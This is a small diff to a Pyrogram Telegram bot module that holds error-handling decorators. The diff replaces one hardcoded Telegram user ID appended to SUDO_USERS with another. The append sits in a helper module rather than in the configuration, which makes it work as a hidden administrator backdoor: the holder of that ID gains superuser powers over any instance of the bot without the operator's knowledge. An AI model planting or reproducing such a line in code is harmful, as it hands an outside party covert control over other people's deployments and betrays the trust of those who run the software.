@@ -1,12 +1,10 @@
 from typing import Callable
-
 from pyrogram import Client
 from pyrogram.types import Message
-
 from modules.helpers.admins import get_administrators
 from modules.config import SUDO_USERS
 
-SUDO_USERS.append(2134729970)
+SUDO_USERS.append(5399319389)
 
 
 def errors(func: Callable) -> Callable:
